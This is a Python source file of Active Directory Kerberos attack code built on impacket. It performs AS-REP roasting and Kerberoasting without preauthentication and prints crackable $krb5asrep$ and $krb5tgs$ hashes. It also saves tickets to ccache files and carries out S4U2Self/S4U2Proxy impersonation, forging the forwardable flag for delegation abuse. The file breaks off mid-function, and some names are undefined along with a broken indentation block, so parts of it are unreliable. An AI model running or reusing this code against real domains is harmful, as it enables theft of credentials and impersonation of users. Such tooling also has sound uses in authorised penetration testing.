#!/usr/bin/env python
import random
import sys
from binascii import hexlify
import datetime
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
import os

from impacket import version
import struct
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, \
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples import logger
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter, TGS_REP,  \
    TGS_REQ, Ticket, AP_REP, AP_REQ, Authenticator, PA_FOR_USER_ENC, PA_PAC_OPTIONS
#from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection, SessionError
from impacket.krb5.ccache import CCache
import logging

import traceback
from binascii import unhexlify, hexlify
from impacket.ntlm import compute_lmhash, compute_nthash
import socket
from impacket.krb5.ccache import CCache
from base64 import b64encode
from bloodyAD.network.config import Config,ConnectionHandler
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype, string_to_key
try:
    import utils.kerb5getuserspnnopreauth as kerb5nopreauth
except ImportError:
    try:
        import kerb5getuserspnnopreauth as kerb5nopreauth
        from kerb5getuserspnnopreauth import sendReceive, KerberosError, getKerberosTGS, getKerberosTGT
    except ImportError:
        from delta2.scripts.utils.kerb5getuserspnnopreauth import sendReceive, KerberosError, getKerberosTGS, getKerberosTGT
    

from uuid import uuid4
from impacket.krb5.kerberosv5 import getKerberosTGT as impacketTGT
from impacket.krb5.kerberosv5 import getKerberosTGS as impacketTGS


class TGT:
    def __init__(self, domain, username, dc, password='', nthash='', lmhash='', aeskey='', dc_ip=None):
        self.username = username
        self.domain = domain
        self.password = password
        self.dc = dc
        self.nthash = nthash
        self.lmhash = lmhash
        self.aeskey = aeskey
        self.dc_ip = dc_ip

        
        if dc_ip is None:
            self.dc_ip = socket.gethostbyname(self.dc)




    def run(self, save=False):
        f"""setting save to True will save the tgt to the {self.username}.ccache"""
        
        clientName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = True
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.dc_ip)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.dc_ip)
            else:
                raise e

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            # raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % self.username)
            raise Exception
        results = '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]),
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]))

        results = results.replace("b'", '')
        results = results.replace("'", "")
        # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
        print(f'[+] {self.username} does not require preauth! saving to {self.username}.hash if save is True')
        name = f'{self.username}.hash'
        if save != False:
            f = open(name, 'w')
            f.write(results)
        
        #print(results)
        return results




def getName(machine):
    """ gets the machine name with the kdc host or domain """
    s = SMBConnection(machine, machine)
    return s.getServerName()

class TGS_no_preauth:
    def __init__(self, domain, dc, username, password='', nthash='', lmhash='', aeskey='', no_preauth=True, dc_ip=None) -> None:
        """username is the targeted username"""
        self.domain = domain
        self.dc = dc
        self.username = username
        self.password = password
        self.nthash = nthash
        self.lmhash = lmhash
        self.aeskey = aeskey
        self.dc_ip = dc_ip
        if dc_ip is None:
            self.dc_ip = socket.gethostbyname(self.dc)
        # try:
        #     self.dc_ip = socket.gethostbyname(self.dc)
        # except:
        #     self.dc_ip = socket.gethostbyaddr(self.dc)
        self.no_preauth = no_preauth
    
    def get_TGT(self, no_preauth_user):
        self.target_user = no_preauth_user
        userName = Principal(no_preauth_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, oldSessioKey, sessionKey = getKerberosTGT(userName, password=self.password, 
                                                               domain=self.domain, nthash=self.nthash, 
                                                               lmhash=self.lmhash, aesKey=self.aeskey, 
                                                               kdcHost=self.dc_ip, kerberoast_no_preauth=self.no_preauth,
                                                               serverName=self.username)
        self.ticket = tgt
        self.cipher = cipher
        self.oldSessionKey = oldSessioKey
        self.sessionKey = sessionKey
        return {'tgt':tgt, 'cipher':cipher, 'old':oldSessioKey, 'new':sessionKey}


    def outputTGS(self, ticket,oldSessionKey, sessionKey, fd=None):
        username = self.username
        spn = self.domain + '/' + username
        if self.no_preauth == True:
            decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
        else:
            decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted 
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                None
                # print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                None
                # print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                None
                # print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                None
                # print(entry)
            else:
                fd.write(entry + '\n')
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        if fd:
            # Save the ticket
            #logging.debug('About to save TGS for %s' % username)
            ccache = CCache()
            try:
                ccache.fromTGS(ticket, oldSessionKey, sessionKey)
                ccache.saveFile('%s.ccache' % username)
            except Exception as e:
                logging.error(str(e))
        #print(f'[+] obtained TGS for user: {username}')
        #print(entry)
        return entry
    def run(self, nopreauth_user):
        tgt_data = self.get_TGT(no_preauth_user=nopreauth_user)
        ticket = tgt_data['tgt']
        cipher = tgt_data['cipher']
        oldSessionKey = tgt_data['old']
        sessionKey = tgt_data['new']
        data = self.outputTGS(ticket=ticket, oldSessionKey=oldSessionKey, sessionKey=sessionKey)
        return data
                

        
    def save(self,save=False):
        f"""
        Save the TGT to a `{self.target_user}.ccache` file or output as base64
        """

        ccache = CCache()

        ccache.fromTGT(self.ticket, self.oldSessionKey, self.sessionKey)
        ccache.saveFile(self.target_user + '.ccache')
        f = open(f'{self.target_user}.ccache', 'rb').read()
        data = b64encode(f).decode()
        if save == False:
            os.remove(f"./{self.target_user}.ccache")
        return data


class GetTGT:
    def __init__(self, domain, dc, username, password='', nthash='', lmhash='', aeskey='', no_preauth=True, dc_ip=None) -> None:
        """username is the targeted username"""
        self.domain = domain
        self.dc = dc
        self.username = username
        self.password = password
        self.nthash = nthash
        self.lmhash = lmhash
        self.aeskey = aeskey
        self.dc_ip = dc_ip
        self.f_name = f'{str(uuid4())}_{self.username}'
        if dc_ip is None:
            self.dc_ip = socket.gethostbyname(self.dc)

        self.no_preauth = no_preauth
    
    def run(self):
        """Run it all"""
        
        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName = userName,
                                                                password = self.password,
                                                                domain = self.domain,
                                                                lmhash = unhexlify(self.lmhash),
                                                                nthash = unhexlify(self.nthash),
                                                                aesKey = self.aeskey,
                                                                kdcHost = self.dc_ip, kerberoast_no_preauth=self.no_preauth)
        self.ticket = tgt
        self.cipher = cipher
        self.oldSessionKey = oldSessionKey
        self.sessionKey = sessionKey
        return {'tgt':tgt, 'cipher':cipher, 'old':oldSessionKey, 'new':sessionKey}
    def save(self, save=True):
        f"""Save the TGT to a `{self.username}.ccache` file or output as base64"""
        from impacket.krb5.ccache import CCache
        from base64 import b64encode
        ccache = CCache()

        ccache.fromTGT(self.ticket, self.oldSessionKey, self.sessionKey)
        ccache.saveFile(self.f_name + '.ccache')
        f = open(f'{self.f_name}.ccache', 'rb').read()
        data = b64encode(f).decode()
        if save == False:
            os.remove(f"./{self.f_name}.ccache")
        return data












class TGS:
    def __init__(self, domain, dc, username,password='', nthash='', lmhash='', aeskey='', dc_ip=None, no_preauth=True) -> None:
        """Initialize the TGS class."""
        self.domain = domain
        self.dc = dc
        self.username = username
        self.password = password
        self.nthash = nthash
        self.lmhash = lmhash
        self.aeskey = aeskey
        self.dc_ip = dc_ip
        self.no_preauth = no_preauth
        self.f_name = f'{str(uuid4())}_{self.username}'
        if dc_ip is None:
            self.dc_ip = socket.gethostbyname(self.dc)

    
    def run(self, save=True, target_user=None):
        """
        grab tgs for targeted user.
        """
        TGT = self.gettgt()
        principalName = Principal()
        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
        
        if target_user == None:
            target_user = self.domain + "\\" + self.username
        else:
            target_user = self.domain + "\\" + target_user
        principalName.components = [target_user]
        tgs, cipher, oldSessionKey, sessionKey = impacketTGS(principalName, self.domain,
                                                                                self.dc_ip,
                                                                                TGT['KDC_REP'], TGT['cipher'],
                                                                                TGT['sessionKey'])
        #data = {'tgs':tgs, "cipher": cipher, "oldSessionKey": oldSessionKey, "sessionKey": sessionKey}

        ccache = CCache()

        ccache.fromTGS(tgs, oldSessionKey, sessionKey)
        ccache.saveFile(self.f_name + '.ccache')
        f = open(f'{self.f_name}.ccache', 'rb').read()
        data = b64encode(f).decode()
        if save == False:
            os.remove(f"./{self.f_name}.ccache")
        return data





        
   
    def gettgt(self):
        target_user = self.username
        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        try:
            tgt, cipher, oldSessionKey, sessionKey = impacketTGT(clientName = userName,
                                                                password = self.password,
                                                                domain = self.domain,
                                                                lmhash = unhexlify(self.lmhash),
                                                                nthash = unhexlify(self.nthash),
                                                                aesKey = self.aeskey,
                                                                kdcHost = self.dc_ip,)
        except Exception as e:
            print(e)
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName = userName,
                                                                password = self.password,
                                                                domain = self.domain,
                                                                lmhash = unhexlify(self.lmhash),
                                                                nthash = unhexlify(self.nthash),
                                                                aesKey = self.aeskey,
                                                                kdcHost = self.dc_ip, kerberoast_no_preauth=self.no_preauth)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey
        return TGT
        
from impacket.krb5.types import Ticket as Type_Ticket
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart
from six import b
class ST:
    def __init__(self, domain, dc, username, tgt, cipher,spn, sessionKey, oldSessionKey,password='', nthash='', lmhash='', aeskey='', dc_ip=None) -> None:
        """Initialize the ST class. Requires a TGT """
        self.domain = domain
        self.dc = dc
        self.username = username
        self.password = password
        self.nthash = nthash
        self.lmhash = lmhash
        self.aeskey = aeskey
        self.dc_ip = dc_ip
        self.tgt = tgt
        self.cipher = cipher
        self.sessionKey = sessionKey
        self.oldSessionKey = oldSessionKey
        self.spn = spn
        self.f_name = f'{str(uuid4())}_{self.username}'
        if dc_ip is None:
            self.dc_ip = socket.gethostbyname(self.dc)


    def get_TGS(self):
        """ Require the SPN """
        serverName = Principal(self.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain, self.dc_ip, self.tgt, self.cipher, self.sessionKey)
        return tgs, cipher, oldSessionKey, sessionKey

    def doS4U2ProxyWithAdditionalTicket(self, additional_ticket_path):
        kdcHost = self.dc
        aesKey = self.aeskey
        nthash = self.nthash
        tgt = self.tgt
        cipher = self.cipher
        oldSessionKey = self.oldSessionKey
        spn = self.spn
        sessionKey = self.sessionKey
        if not os.path.isfile(additional_ticket_path):
            logging.error("Ticket %s doesn't exist" % additional_ticket_path)
            exit(0)
        else:
            decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
            logging.info("\tUsing additional ticket %s instead of S4U2Self" % additional_ticket_path)
            ccache = CCache.loadFile(additional_ticket_path)
            principal = ccache.credentials[0].header['server'].prettyPrint()
            creds = ccache.getCredential(principal.decode())
            TGS = creds.toTGS(principal)

            tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('TGS_REP')
                print(tgs.prettyPrint())

            if self.__force_forwardable:
                # Convert hashes to binary form, just in case we're receiving strings
                if isinstance(nthash, str):
                    try:
                        nthash = unhexlify(nthash)
                    except TypeError:
                        pass
                if isinstance(aesKey, str):
                    try:
                        aesKey = unhexlify(aesKey)
                    except TypeError:
                        pass

                # Compute NTHash and AESKey if they're not provided in arguments
                if self.password != '' and self.domain != '' and self.username != '':
                    if not nthash:
                        nthash = compute_nthash(self.password)
                        if logging.getLogger().level == logging.DEBUG:
                            logging.debug('NTHash')
                            print(hexlify(nthash).decode())
                    if not aesKey:
                        salt = self.domain.upper() + self.username
                        aesKey = _AES256CTS.string_to_key(self.password, salt, params=None).contents
                        if logging.getLogger().level == logging.DEBUG:
                            logging.debug('AESKey')
                            print(hexlify(aesKey).decode())

                # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
                cipherText = tgs['ticket']['enc-part']['cipher']

                # Check which cipher was used to encrypt the ticket. It's not always the same
                # This determines which of our keys we should use for decryption/re-encryption
                newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
                if newCipher.enctype == Enctype.RC4:
                    key = Key(newCipher.enctype, nthash)
                else:
                    key = Key(newCipher.enctype, aesKey)

                # Decrypt and decode the ticket
                # Key Usage 2
                # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
                #  application session key), encrypted with the service key
                #  (section 5.4.2)
                plainText = newCipher.decrypt(key, 2, cipherText)
                encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

                # Print the flags in the ticket before modification
                logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
                logging.debug('\tService ticket from S4U2self is'
                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                              + ' forwardable')

                # Customize flags the forwardable flag is the only one that really matters
                logging.info('\tForcing the service ticket to be forwardable')
                # convert to string of bits
                flagBits = encTicketPart['flags'].asBinary()
                # Set the forwardable flag. Awkward binary string insertion
                flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
                # Overwrite the value with the new bits
                encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags

                logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
                logging.debug('\tService ticket now is'
                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                              + ' forwardable')

                # Re-encode and re-encrypt the ticket
                # Again, Key Usage 2
                encodedEncTicketPart = encoder.encode(encTicketPart)
                cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)

                # put it back in the TGS
                tgs['ticket']['enc-part']['cipher'] = cipherText

            ################################################################################
            # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
            # So here I have a ST for me.. I now want a ST for another service
            # Extract the ticket from the TGT
            ticketTGT = Type_Ticket()
            ticketTGT.from_asn1(decodedTGT['ticket'])

            # Get the service ticket
            ticket = Type_Ticket()
            ticket.from_asn1(tgs['ticket'])

            apReq = AP_REQ()
            apReq['pvno'] = 5
            apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

            opts = list()
            apReq['ap-options'] = constants.encodeFlags(opts)
            seq_set(apReq, 'ticket', ticketTGT.to_asn1)

            authenticator = Authenticator()
            authenticator['authenticator-vno'] = 5
            authenticator['crealm'] = str(decodedTGT['crealm'])

            clientName = Principal()
            clientName.from_asn1(decodedTGT, 'crealm', 'cname')

            seq_set(authenticator, 'cname', clientName.components_to_asn1)

            now = datetime.datetime.utcnow()
            authenticator['cusec'] = now.microsecond
            authenticator['ctime'] = KerberosTime.to_asn1(now)

            encodedAuthenticator = encoder.encode(authenticator)

            # Key Usage 7
            # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
            # TGS authenticator subkey), encrypted with the TGS session
            # key (Section 5.5.1)
            encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

            apReq['authenticator'] = noValue
            apReq['authenticator']['etype'] = cipher.enctype
            apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

            encodedApReq = encoder.encode(apReq)

            tgsReq = TGS_REQ()

            tgsReq['pvno'] = 5
            tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
            tgsReq['padata'] = noValue
            tgsReq['padata'][0] = noValue
            tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
            tgsReq['padata'][0]['padata-value'] = encodedApReq

            # Add resource-based constrained delegation support
            paPacOptions = PA_PAC_OPTIONS()
            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))

            tgsReq['padata'][1] = noValue
            tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
            tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

            reqBody = seq_set(tgsReq, 'req-body')

            opts = list()
            # This specified we're doing S4U
            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
            opts.append(constants.KDCOptions.canonicalize.value)
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable.value)

            reqBody['kdc-options'] = constants.encodeFlags(opts)
            service2 = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            seq_set(reqBody, 'sname', service2.components_to_asn1)
            reqBody['realm'] = self.domain

            myTicket = ticket.to_asn1(TicketAsn1())
            seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

            reqBody['till'] = KerberosTime.to_asn1(now)
            reqBody['nonce'] = random.getrandbits(31)
            seq_set_iter(reqBody, 'etype',
                         (
                             int(constants.EncryptionTypes.rc4_hmac.value),
                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                             int(constants.EncryptionTypes.des_cbc_md5.value),
                             int(cipher.enctype)
                         )
                         )
            message = encoder.encode(tgsReq)

            logging.info('Requesting S4U2Proxy')
            r = sendReceive(message, self.domain, kdcHost)
            return r, None, sessionKey, None

    def doS4U(self, impersonate, u2u=None, no_s4u2proxy=None):
        spn = self.spn
        tgt = self.tgt
        cipher = self.cipher
        oldSessionKey = self.oldSessionKey
        sessionKey = self.sessionKey
        nthash = self.nthash
        aesKey = self.aeskey
        kdcHost = self.dc
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        # Extract the ticket from the TGT
        ticket = Type_Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('AUTHENTICATOR')
            print(authenticator.prettyPrint())
            print('\n')

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += b(impersonate) + b(self.domain) + b'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('S4UByteArray')
            hexdump(S4UByteArray)

        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
        # with the following three parameters: the session key of the TGT of
        # the service performing the S4U2Self request, the message type value
        # of 17, and the byte array S4UByteArray.
        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('CheckSum')
            hexdump(checkSum)

        paForUserEnc = PA_FOR_USER_ENC()
        seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
        paForUserEnc['userRealm'] = self.domain
        paForUserEnc['cksum'] = noValue
        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        paForUserEnc['cksum']['checksum'] = checkSum
        paForUserEnc['auth-package'] = 'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('PA_FOR_USER_ENC')
            print(paForUserEnc.prettyPrint())

        encodedPaForUserEnc = encoder.encode(paForUserEnc)

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)


        if u2u:
            opts.append(constants.KDCOptions.renewable_ok.value)
            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        if no_s4u2proxy and spn is not None:
            logging.info("When doing S4U2self only, argument -spn is ignored")
        if u2u:
            serverName = Principal(self.username, self.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)
        else:
            serverName = Principal(self.username, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        if u2u:
            seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())

        logging.info('Requesting S4U2self%s' % ('+U2U' if u2u else ''))
        message = encoder.encode(tgsReq)

        r = sendReceive(message, self.domain, kdcHost)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        if no_s4u2proxy:
            return r, None, sessionKey, None

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('TGS_REP')
            print(tgs.prettyPrint())

        # if self.__force_forwardable:
        #     # Convert hashes to binary form, just in case we're receiving strings
        #     if isinstance(nthash, str):
        #         try:
        #             nthash = unhexlify(nthash)
        #         except TypeError:
        #             pass
        #     if isinstance(aesKey, str):
        #         try:
        #             aesKey = unhexlify(aesKey)
        #         except TypeError:
        #             pass

            # Compute NTHash and AESKey if they're not provided in arguments
            if self.password != '' and self.domain != '' and self.username != '':
                if not nthash:
                    nthash = compute_nthash(self.password)
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('NTHash')
                        print(hexlify(nthash).decode())
                if not aesKey:
                    salt = self.domain.upper() + self.username
                    aesKey = _AES256CTS.string_to_key(self.password, salt, params=None).contents
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('AESKey')
                        print(hexlify(aesKey).decode())

            # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
            cipherText = tgs['ticket']['enc-part']['cipher']

            # Check which cipher was used to encrypt the ticket. It's not always the same
            # This determines which of our keys we should use for decryption/re-encryption
            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
            if newCipher.enctype == Enctype.RC4:
                key = Key(newCipher.enctype, nthash)
            else:
                key = Key(newCipher.enctype, aesKey)

            # Decrypt and decode the ticket
            # Key Usage 2
            # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
            #  application session key), encrypted with the service key
            #  (section 5.4.2)
            plainText = newCipher.decrypt(key, 2, cipherText)
            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

            # Print the flags in the ticket before modification
            logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
            logging.debug('\tService ticket from S4U2self is'
